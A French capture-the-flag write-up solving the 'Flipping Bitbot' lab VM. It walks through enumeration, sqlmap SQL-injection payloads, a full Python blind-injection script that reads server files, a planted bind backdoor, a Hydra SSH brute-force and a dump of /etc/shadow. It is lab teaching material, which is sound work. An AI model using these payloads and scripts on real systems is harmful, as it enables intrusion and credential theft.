# Solution du CTF Flipping Bitbot

Présentation
------------

Après [RA1NXing Bots](http://devloop.users.sourceforge.net/index.php?article87/solution-du-ctf-ra1nxing-bots), [Flipping Bitbot](http://vulnhub.com/entry/bot-challenges-flipping-bitbot,54/) est le second d'une série de ~~3~~ maintenant 4 CTF orientés sur l'analyse de botnet.  

Le challenge donne une image virtuelle au format vmdk qui a montré des réticences à fonctionner parfaitement sous VirtualBox.  

Aussi si vous lancez la VM faites bien attention aux messages d'erreurs affichés dans la console.  

Autre information capitale : vous devriez lire [cette page](http://sourceforge.net/p/flippingbitbot/wiki/Home/) qui vous amènera [ici](http://blog.cylance.com/a-study-in-bots-bitbot) (j'ai forcé un archivage de la page par Archive.org aussi) sans quoi vous risquez de tourner en rond un moment avant de trouver quelque chose.  

Ce n'est pas du spoiler, j'essaie de m'en tenir toujours au minimum nécessaire à la mise en place du CTF dans mes introductions.  

Oublie que t'as aucune chance, vas-y fonce
------------------------------------------

Le scan des ports révèlent différents services dont du RPC qui ne nous sera d'aucune utilité :  

```plain
Starting Nmap 6.46 ( http://nmap.org ) at 2014-06-03 21:35 CEST
Nmap scan report for 192.168.1.29
Host is up (0.00022s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4 (protocol 2.0)
| ssh-hostkey: 
|   1024 e0:dc:be:e9:72:1b:c8:77:40:d2:38:2c:43:c9:b3:49 (DSA)
|   2048 88:e2:0c:77:06:bd:27:5a:14:06:58:c3:d5:41:21:f0 (RSA)
|_  256 73:11:64:71:a6:c0:a3:f1:60:b5:cf:fa:78:42:5a:a0 (ECDSA)
80/tcp    open  http    Apache httpd 2.2.22 ((Debian))
|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          37141/tcp  status
|_  100024  1          51561/udp  status
37141/tcp open  status  1 (RPC #100024)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          37141/tcp  status
|_  100024  1          51561/udp  status
MAC Address: 08:00:27:39:BC:95 (Cadmus Computer Systems)
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Sur le site web on trouve un lien vers */bot/bot.py* qui nous est interdit (erreur 403).  

J'ai lancé le module htaccess de *Wapiti* pour voir s'il était possible de bypasser le 403 puis voyant que je n'avais pas de résultat j'ai lancé des requêtes à la main (via Python et *requests*) pour envoyer différentes méthodes (GET, POST, OPTIONS, ABC...) sans plus de résultat.  

J'ai alors décidé de lancer *dirb* qui a découvert quelques dossiers sans grand intérêt (css, images, libraries...)  

J'ai aussi utilisé le module de *Metasploit* destiné à énumérer les éventuels utilisateurs (dans le cas où *mod\_userdir* aurait été activé) : nada.  

Avec *DirBuster* (un équivalent en Java de dirb) j'ai eu des résultats plus intéressants puisqu'il m'a trouvé les scripts suivants :  

```plain
/stats.php
/submit.php
/header.php
/admin.php
/index.php
/bots.php
/commands.php
/footer.php
/config.php
/functions.php
/gate2.php
/loginheader.php
```

Notez que c'est seulement une question de wordlists et d'options utilisées ainsi avec *dirb* on peut aussi obtenir des résultats satisfaisant de cette façon (avec l'une des wordlists par défaut) :  

```plain
./dirb http://192.168.1.29/ wordlists/vulns/cgis.txt -r -X .php
```

Mais j'ai trouvé d'autres wordlists qui s'avèrent très pratiques [sur ce site](http://blog.thireus.com/web-common-directories-and-filenames-word-lists-collection).  

Bien sûr j'ai cherché des vulnérabilités dans le site qui est le C&C du botnet avec la page de connexion pour la gestion des bots à /admin.  

*Wapiti* et *sqlmap* n'ont révélé aucune vulnérabilités :(  

Des scripts Python fait-maison de brute-force et un autre pour tester les paramètres web les plus communs plus tard... toujours bredouille (ou plutôt *brocouille* comme on dit dans le *Bouchonnois*).  

C'est en particulier la vitesse qu'a mit le script de brute-force qui m'a mit la puce à l'oreille : pour aller si vite il ne doit pas y avoir de liaison avec une base de données (j'avais en partie raison).  

Dusse, avec un D comme Dusse
----------------------------

Après avoir bien fait attention aux logs au lancement de la VM sous *VirtualBox* j'ai remarqué que *MySQLd* ne se lançait pas : manque de place sur une partition... la lose !  

Ok, on recommence depuis *VMPlayer* et là pas de messages d'erreurs.  

Cela dis ça ne m'avance pas plus. Je suis donc partis en quête d'un indice que j'ai trouvé sur la page Wiki du projet du CTF sur Sourceforge (voir intro) : le script *gate2.php* est vulnérable à une injection SQL.  

Planté de baton
---------------

Dans sa prose verbeuse sqlmap nous informe de la trouvaille suivante :  

```plain
sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
---
Place: GET
Parameter: hwid
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: windows=Windows&country=US&hwid=101' AND 5156=5156 AND 'aLVc'='aLVc&connection=0&version=100&btc=all&sysinfo=info

    Type: UNION query
    Title: MySQL UNION query (NULL) - 12 columns
    Payload: windows=Windows&country=US&hwid=-2630' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7162617271,0x78746645566b77486248,0x716b696471),NULL,NULL,NULL#&connection=0&version=100&btc=all&sysinfo=info

    Type: AND/OR time-based blind
    Title: MySQL > 5.0.11 AND time-based blind
    Payload: windows=Windows&country=US&hwid=101' AND SLEEP(5) AND 'vggK'='vggK&connection=0&version=100&btc=all&sysinfo=info
---
```

Le script est attaquable soit par une attaque time-based (complètement blind) soit boolean-based (disons à moitié aveugle).  

*sqlmap* ne parvient cependant pas à nous donner de shell quelconque et les options de lecture de fichier (*--file-read*) s'avèrent aussi inopérantes :(  

Par conséquent il a fallut faire un autre script home-made capable d'extraire le contenu des fichiers présents sur le système via l'attaque boolean-based (j'ai joué un peu avec la time-based et elle est très difficile à exploiter, l'injection devant se faire dans une boucle ou une jointure, le payload provoque vite des dégâts sur la VM).  

J'ai défini un alphabet pour tester chaque caractère. Ce dernier n'est sans doute pas optimal, il aurait fallu utiliser un calculateur de fréquences et se baser sur différents fichier PHP pour qu'il soit vraiment optimal. Ici j'ai juste mis les whitespaces ainsi que certains caractères en premier suivi des lettres dans l'ordre de fréquence anglophone.  

En fait le meilleur aurait été de faire une énumération par bit : si on ne cherche à lire que des fichiers textuels on peut se contenter de tester les 7 derniers bits de chaque octets ce qui réduit le nombre final de requêtes (dans mon code, si on croise un point d'interrogation on émet beaucoup trop de requêtes).  

Ça donne ça :  

```python
import requests
import sys

if len(sys.argv) < 2:
    print "Usage: {0} /path/to/file".format(sys.argv[1])
    sys.exit()

alphabet = " \r\n;.$=eariotnslcudpmhgbfywkvxzjq\"'\t(){}[]EARIOTNSLCUDPMHGBFYWKVXZJQ_!#%&*+,-/0123456789><?@\\:"
URL = (
    "http://192.168.1.100/gate2.php?"
    "windows=Windows&country=US&hwid=1%27%20and%20"
    "ord(mid(load_file(0x{0}),{1},1))={2}"
    "%20and%20%271%27=%271&connection=0&version=100&btc=all&sysinfo=info"
    )

hex_fname = sys.argv[1].encode("hex_codec")
sess = requests.session()
i = 1
nb_unknown = 0
while True:
    found = False
    for c in alphabet:
        pos = str(i)
        char = str(ord(c))
        r = sess.get(URL.format(hex_fname, pos, char))
        if len(r.content):
            sys.stdout.write(c)
            sys.stdout.flush()
            found = True
            nb_unknown = 0
            break
    i += 1
    if not found:
        sys.stdout.write('`')
        sys.stdout.flush()
        nb_unknown += 1

    if nb_unknown == 3:
        break
```

Pour le fichier */var/www/config.php* on obtient (avec beaucoup de patience) :  

```php
<?php
//Timezone
date_default_timezone_set('Europe/London'); // VISIT http://www.php.net/manual/en/timezones.php For list of timezones
//Admin Configs
$ADMIN_USER_NAME        = 'botter'; //panel username
$ADMIN_PASSWORD         = 'IF I CAME UP WITH UNIQUE PASSWORDS, I WOULD BE HOME BY NOW'; //panel password
//SQL Configs
$SQL_HOST               = 'localhost'; //db host
$SQL_USER_NAME  = 'root'; //db user
$SQL_PASSWORD   = 'THIS PASSWORD WILL NOT HELP YOU'; //db pass
$SQL_DATABASE   = 'bitbot'; //db name
$SQL_CONNECTION = @mysql_connect($SQL_HOST,$SQL_USER_NAME,$SQL_PASSWORD);
//Panel Configs
$BOT_PAGE_MAX   = '50';
//Mining Configs
$JSONurl = ''; //follow readme
$apitoken = ''; //follow readme
$apihash = 'hashrate'; //follow readme
$crypto = 'btc'; //btc or ltc
////////////////Do Not Edit Beyond This Point///////////////////////////////////////////
$BOT_CHECKIN_INTERVAL = '60';  //seconds
$CMD_SPLIT              = '<\\\\\>';
$CMD_DOWNLOAD   = 'DOWN';
$CMD_UPDATE             = 'UPDATE';
$CMD_VISIT_SITE         = 'VISIT';
$CMD_REMOVE             = 'REMOVE';
$CMD_DDOS_STOP  = 'STOP';
$CMD_BTC = 'MINE';
$CMD_STOPBTC = 'STOPMINE';
?>
```

Je sens que je vais conclure
----------------------------

On peut ainsi se connecter avec les identifiants d’administration sur */admin.php*.  

L'interface permet de spécifier certaines commandes prédéfinies que les bots exécuteront à leur prochaine connexion (c'est un botnet HTTP, rappelons-le).  

![Bitbot command panel](https://raw.githubusercontent.com/devl00p/blog/master/images/bitbot_commands.png)

La commande *DOWN* semble tout indiqué pour que l'on récupère un shell mais si je lui passe l'adresse d'un *tshd* compilé statiquement ce dernier est bien récupéré mais le port de la backdoor n'est pas ouverte.  

Le bot étant écrit en Python il est probable qu'il n'accepte d'exécuter que du code Python.  

J'ai trouvé [sur pastebin une backdoor Python très basique](http://pastebin.com/nTzn08TL) qui bind() un port mais fera notre affaire :)  

```plain
$ ncat 192.168.1.29 31337 -v
Ncat: Version 6.01 ( http://nmap.org/ncat )
Ncat: Connected to 192.168.1.29:31337.
id
uid=1000(botter) gid=1000(botter) groups=1000(botter),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
cat /var/www/bot/bot.py
# -*- coding: utf-8 *-*
import httplib
import urllib
import threading
import time
import hashlib
import os

# Emulated bitbot by bwall (Brian Wallace @botnet_hunter)

class Bot():
    def __init__(self, version, country, windows, hwid, sysinfo, btc):
        self.version = version
        self.country = country
        self.windows = windows
        self.hwid = hwid
        self.sysinfo = sysinfo
        self.btc = btc
        self.connection = 0
        self.removed = False
--- snip ---
```

On ajoutera un fichier *authorized\_keys* à l'utilisateur *Botter* pour obtenir un shell digne de ce nom.  

Dans les processus on retrouve le ssh, un *Exim* (101 = utilisateur spécifique exim) et le bot Python :  

```plain
root      2661  0.0  0.2   6464  1084 ?        Ss   00:16   0:00 /usr/sbin/sshd
101       3060  0.0  0.1   7400   908 ?        Ss   00:16   0:00 /usr/sbin/exim4 -bd -q30m
root      3101  0.0  0.2   3488  1440 ?        S    00:16   0:00 sudo -u botter python /var/www/bot/bot.py
```

Dans */home/botter* se trouve un fichier *gen.sh* dont voici le contenu :  

```plain
$ cat gen.sh
ifconfig eth0 | grep inet | grep -v inet6 | awk '{print $2substr(rand(),0,5);}' | awk '{print $0"\n"$0}' | passwd
```

Plusieurs observations :  

* le fichier appartient à l'utilisateur root
* ifconfig n'est pas appelé via son path complet or l'utilisateur Botter n'a pas /sbin dans son path
* deux lignes sont passées à passwd comme si le mot de passe courant n'avait pas été demandé

Tout nous indique que le script a été lancé en tant que root.  

Le kernel est un 3.2.0-4-686-pae donc on va fouiller côté mot de passe plutôt qu'essayer de trouver un exploit pour le kernel.  

Si je lance les commandes du script (sauf le passwd final) j'obtiens ceci :  

```plain
addr:192.168.1.290.19
addr:192.168.1.290.19
```

En fait seul les deux derniers caractères sont générés aléatoirement, les autres sont fixes ou liés à l'IP.  

Faire rentrer le crapaud dans la bouteille
------------------------------------------

C'était l’occasion de tester [unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check) qui n'a rien retourné de plus que des faux positifs.  

Finalement à grands coups de grep j'ai retrouvé un appel de ce script dans */etc/rc.local* :  

```bash
sh /home/botter/gen.sh
mysql -u root -p'THIS PASSWORD WILL NOT HELP YOU' -Nse 'show tables' bitbot | while read table; do mysql -u root -p'THIS PASSWORD WILL NOT HELP YOU' -e "truncate table $table" bitbot; done
mysql -u root -p'THIS PASSWORD WILL NOT HELP YOU' bitbot < /var/www/dbdump.sql
sudo -u botter python /var/www/bot/bot.py > /dev/null &
exit 0
```

Donc le script est lancé au démarrage de la VM après l'initialisation du réseau. On a donc une des inconnues : l'adresse IP :)  

Il ne reste qu'à générer un dictionnaire avec les possibilités :  

```python
#!/usr/bin/python
fmt = "addr:192.168.1.290.{0}\n"

fd = open("dict.txt", "w")
for i in range(0, 100):
    word = fmt.format(str(i).rjust(2, "0"))
    fd.write(word)
fd.close()
```

On teste ça avec la dernière version de *THC-Hydra* :  

```plain
$ ./hydra -f -l root -P ../dict.txt -e nsr ssh://192.168.1.29
Hydra v8.0 (c) 2014 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2014-06-09 11:17:43
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 103 login tries (l:1/p:103), ~0 tries per task
[DATA] attacking service ssh on port 22
[22][ssh] host: 192.168.1.29   login: root   password: addr:192.168.1.290.89
[STATUS] attack finished for 192.168.1.29 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2014-06-09 11:17:58
```

Et on applique :  

```plain
botter@Bitbot:~$ su -
Password: 
root@Bitbot:~# id
uid=0(root) gid=0(root) groups=0(root)
root@Bitbot:~# head -1 /etc/shadow
root:$6$YlSK9y.8$uoWD0hXm.UgrLTCnf/fxWt2T67xcZdUKMsvs8jeSQAc5jzzHn46uuTRK4dDijdv9DEZ5XHwO2DAZAQBiYmElE/:16229:0:99999:7:::
```

Hummm c'est goûtu, ça a du retour !

*Published June 09 2014 at 16:11*